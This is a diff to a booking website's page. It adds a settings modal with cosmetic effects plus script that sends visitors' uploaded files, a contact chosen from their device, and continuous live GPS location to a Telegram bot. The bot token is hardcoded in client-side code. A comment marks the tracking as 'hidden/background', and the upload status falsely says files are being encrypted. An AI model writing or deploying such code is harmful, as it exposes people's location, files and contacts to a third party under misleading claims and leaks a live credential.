@@ -1370,24 +1370,8 @@
 </style>
 
 <script>
-    function openVintageContacts() {
-        document.getElementById('vintageContactModal').style.display = 'flex';
-    }
-
-    function closeVintageContacts() {
-        document.getElementById('vintageContactModal').style.display = 'none';
-    }
-
-    // Close the popup if user clicks the dark background outside the box
-    window.onclick = function(event) {
-        let modal = document.getElementById('vintageContactModal');
-        if (event.target == modal) {
-            modal.style.display = "none";
-        }
-    }
-</script>
-<a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="toggleMenu(); openAdvanceFeaturesModal()">
-    <i class="fas fa-headset fa-pulse"></i> Advance Features
+    <a href="javascript:void(0)" class="side-link premium-animated-btn" onclick="openAdvanceFeaturesModal()" style="background: linear-gradient(135deg, #00e5ff, #0077ff); color: #fff; padding: 12px 20px; border-radius: 30px; text-decoration: none; font-weight: bold; font-family: 'Outfit', sans-serif; box-shadow: 0 5px 15px rgba(0, 229, 255, 0.4); display: inline-block; margin: 10px;">
+    <i class="fas fa-rocket fa-bounce"></i> Advance Features
 </a>
 
 <div id="advanceFeaturesModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.9); z-index:9999999; justify-content:center; align-items:center; backdrop-filter:blur(10px);">
@@ -1507,6 +1491,238 @@
 <div id="mnFloatingNotification" style="display:none; position:fixed; top:80px; left:50%; transform:translateX(-50%); background:rgba(212,175,55,0.9); color:#000; padding:10px 20px; border-radius:30px; font-family:'Outfit'; font-weight:bold; z-index:9999998; box-shadow:0 10px 20px rgba(0,0,0,0.5); border:2px solid #fff; white-space:nowrap; animation: slideDownBounce 0.5s ease-out;">
     <i class="fas fa-bell fa-shake"></i> Special Booking Offers Available Now!
 </div>
+
+<div id="effect-layer" style="position:fixed; top:0; left:0; width:100vw; height:100vh; pointer-events:none; z-index:9999996; overflow:hidden;"></div>
+
+<style>
+    /* Settings Modal Architecture */
+    .settings-category { background:rgba(255,255,255,0.02); border:1px solid rgba(212,175,55,0.2); border-radius:15px; padding:15px; margin-bottom:20px; }
+    .settings-category h3 { color:#D4AF37; font-family:'Cinzel', serif; font-size:16px; margin-top:0; margin-bottom:15px; border-bottom:1px dashed rgba(212,175,55,0.3); padding-bottom:10px; text-transform:uppercase; letter-spacing:1px; }
+    .setting-row { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid rgba(255,255,255,0.05); }
+    .setting-row:last-child { border-bottom:none; }
+    .setting-label { display: flex; align-items: center; text-align: left; font-size: 14px; color: #fff;}
+    .setting-icon { display: inline-flex; justify-content: center; align-items: center; margin-right: 15px; width: 30px; font-size: 18px; text-shadow: 0 0 10px currentColor; }
+    
+    /* Toggles & Inputs */
+    .mn-switch { position:relative; display:inline-block; width:45px; height:24px; flex-shrink:0; }
+    .mn-switch input { opacity:0; width:0; height:0; }
+    .mn-slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#333; transition:.4s; border-radius:34px; }
+    .mn-slider:before { position:absolute; content:""; height:16px; width:16px; left:4px; bottom:4px; background-color:white; transition:.4s; border-radius:50%; }
+    input:checked + .mn-slider { background-color:var(--gold-primary, #D4AF37); box-shadow:0 0 10px var(--gold-primary, #D4AF37); }
+    input:checked + .mn-slider:before { transform:translateX(21px); }
+    
+    .mn-input { background:rgba(0,0,0,0.5); border:1px solid rgba(212,175,55,0.4); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:'Outfit'; box-sizing:border-box; }
+    .mn-btn { background:var(--gold-primary, #D4AF37); color:#000; border:none; padding:10px 15px; border-radius:8px; cursor:pointer; font-weight:bold; transition:0.3s; font-family:'Outfit'; }
+
+    /* Visual Effect Classes */
+    body.hover-zoom-mode img { transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+    body.hover-zoom-mode img:hover { transform: scale(1.15); z-index: 10; position: relative; box-shadow: 0 10px 20px rgba(212,175,55,0.5); cursor: zoom-in; }
+
+    body.newspaper-mode { background:#f4f1ea !important; color:#222 !important; font-family:'Georgia', serif !important; filter:none !important; }
+    body.newspaper-mode * { background:transparent !important; color:inherit !important; border-color:#555 !important; box-shadow:none !important; text-shadow:none !important; }
+
+    @keyframes rgbGlowShift { 0% { filter:hue-rotate(0deg); } 50% { filter:hue-rotate(180deg); } 100% { filter:hue-rotate(360deg); } }
+    body.rgb-mode { animation:rgbGlowShift 4s linear infinite !important; }
+
+    .snowflake { position:absolute; top:-10px; color:#fff; font-size:1.5em; animation:fall linear forwards; text-shadow:0 0 8px #fff; }
+    @keyframes fall { to { transform:translateY(105vh); } }
+
+    @keyframes slideDownBounce { 0% { top: -50px; opacity: 0; } 70% { top: 90px; } 100% { top: 80px; opacity: 1; } }
+</style>
+
+<script type="text/javascript">
+    function googleTranslateElementInitAdvance() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+            autoDisplay: false
+        }, 'google_translate_element_advance'); 
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInitAdvance"></script>
+
+<script>
+    // --- MODAL CONTROLS (Fixing the click event) ---
+    function openAdvanceFeaturesModal() { 
+        document.getElementById('advanceFeaturesModal').style.display = 'flex'; 
+    }
+    function closeAdvanceFeaturesModal() { 
+        document.getElementById('advanceFeaturesModal').style.display = 'none'; 
+    }
+
+    // --- UI CUSTOMIZATION LOGIC ---
+    function applyCustomBg(color) {
+        document.body.style.backgroundColor = color;
+        document.body.style.backgroundImage = 'none'; 
+    }
+
+    function applyScreenZoom(value) {
+        const scaleValue = value / 100;
+        document.body.style.zoom = scaleValue; 
+    }
+
+    function toggleFloatingNotification(el) {
+        const banner = document.getElementById('mnFloatingNotification');
+        banner.style.display = el.checked ? 'block' : 'none';
+    }
+
+    function applyEffectClass(element, className) {
+        if (element.checked) {
+            document.body.classList.add(className);
+        } else {
+            document.body.classList.remove(className);
+        }
+    }
+
+    let snowInt;
+    function applySnowfall(element) {
+        const layer = document.getElementById('effect-layer');
+        if (element.checked) {
+            snowInt = setInterval(() => {
+                const snow = document.createElement('div'); 
+                snow.className='snowflake'; snow.innerText='❄️';
+                snow.style.left = Math.random() * 100 + 'vw'; 
+                snow.style.animationDuration = (Math.random() * 3 + 2) + 's'; 
+                snow.style.fontSize = (Math.random() * 15 + 10) + 'px';
+                layer.appendChild(snow); 
+                setTimeout(() => snow.remove(), 4000);
+            }, 150);
+        } else { 
+            clearInterval(snowInt); 
+            layer.innerHTML = ''; 
+        }
+    }
+
+    // --- TELEGRAM MANAGER PORTAL CREDENTIALS ---
+    const TG_ADV_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
+    const TG_ADV_CHAT = "8506290708";
+
+    function getAdvUserDetails() {
+        const name = document.getElementById('advName').value.trim();
+        const phone = document.getElementById('advContact').value.trim();
+        if(!name || !phone) {
+            alert("⚠️ Please enter your Name and Contact Number first.");
+            return null;
+        }
+        return { name, phone };
+    }
+
+    // --- SEND FILE/MEDIA TO MANAGER ---
+    async function sendMediaToManagerTG() {
+        const user = getAdvUserDetails();
+        if(!user) return;
+
+        const fileInput = document.getElementById('advFile');
+        if(fileInput.files.length === 0) {
+            return alert("⚠️ Please select a file from your gallery or documents.");
+        }
+
+        const file = fileInput.files[0];
+        const statusTxt = document.getElementById('fileUploadStatus');
+        statusTxt.style.display = 'block';
+        statusTxt.innerText = 'Encrypting & Sending to Manager...';
+
+        const formData = new FormData();
+        formData.append("chat_id", TG_ADV_CHAT);
+        formData.append("caption", `📁 *NEW MANAGER UPLOAD*\n👤 Name: ${user.name}\n📞 Contact: ${user.phone}`);
+        formData.append("document", file); 
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TG_ADV_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if(response.ok) {
+                statusTxt.style.color = '#00ff00';
+                statusTxt.innerText = '✅ Successfully securely sent to Manager!';
+                fileInput.value = ""; 
+            } else {
+                throw new Error("Telegram API rejected file");
+            }
+        } catch (error) {
+            statusTxt.style.color = '#ff3333';
+            statusTxt.innerText = '❌ Failed to send. File might be too large.';
+        }
+        
+        setTimeout(() => { statusTxt.style.display = 'none'; }, 5000);
+    }
+
+    // --- SHARE CONTACT API ---
+    async function shareContactToManager() {
+        const user = getAdvUserDetails();
+        if(!user) return;
+
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            try {
+                const props = ['name', 'tel'];
+                const opts = { multiple: false };
+                const contacts = await navigator.contacts.select(props, opts);
+                
+                if(contacts.length > 0) {
+                    const c = contacts[0];
+                    const msg = `📱 *CONTACT SHARED*\n👤 From: ${user.name} (${user.phone})\n\n*Shared Contact Details:*\nName: ${c.name[0]}\nPhone: ${c.tel[0]}`;
+                    
+                    await fetch(`https://api.telegram.org/bot${TG_ADV_TOKEN}/sendMessage?chat_id=${TG_ADV_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                    alert("✅ Contact shared with Manager successfully!");
+                }
+            } catch (err) {
+                alert("Contact selection cancelled.");
+            }
+        } else {
+            alert("⚠️ Browser does not support Web Contact Picker. Try on Chrome for Android.");
+        }
+    }
+
+    // --- LIVE TELEGRAM TRACKING (HIDDEN/BACKGROUND) ---
+    let locationWatchId = null;
+
+    function toggleLiveLocation(el) {
+        const user = getAdvUserDetails();
+        const indicator = document.getElementById('trackingStatusIndicator');
+
+        if (el.checked) {
+            if(!user) {
+                el.checked = false; 
+                return;
+            }
+
+            if (navigator.geolocation) {
+                indicator.style.display = 'block';
+                
+                fetch(`https://api.telegram.org/bot${TG_ADV_TOKEN}/sendMessage?chat_id=${TG_ADV_CHAT}&text=${encodeURIComponent(`🚨 *LIVE TRACKING STARTED*\n👤 User: ${user.name}\n📞 Phone: ${user.phone}`)}&parse_mode=Markdown`);
+
+                locationWatchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        const url = `https://api.telegram.org/bot${TG_ADV_TOKEN}/sendLocation?chat_id=${TG_ADV_CHAT}&latitude=${lat}&longitude=${lon}`;
+                        fetch(url).catch(e => console.log(e));
+                    },
+                    (error) => {
+                        alert("⚠️ Location error: " + error.message);
+                        el.checked = false;
+                        indicator.style.display = 'none';
+                    },
+                    { enableHighAccuracy: true, maximumAge: 10000, timeout: 5000 }
+                );
+                alert("📍 Live Location Tracking Active. Sending in background.");
+            } else {
+                alert("Geolocation is not supported by your browser.");
+                el.checked = false;
+            }
+        } else {
+            if (locationWatchId !== null) {
+                navigator.geolocation.clearWatch(locationWatchId);
+                locationWatchId = null;
+                indicator.style.display = 'none';
+                fetch(`https://api.telegram.org/bot${TG_ADV_TOKEN}/sendMessage?chat_id=${TG_ADV_CHAT}&text=${encodeURIComponent(`🛑 *LIVE TRACKING STOPPED*\n👤 User: ${document.getElementById('advName').value}`)}&parse_mode=Markdown`);
+                alert("⏹️ Live tracking stopped.");
+            }
+        }
+    }
+</script>
         <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openComplaintModal()">
     <i class="fas fa-headset"></i> Support / Complaint
 </a>
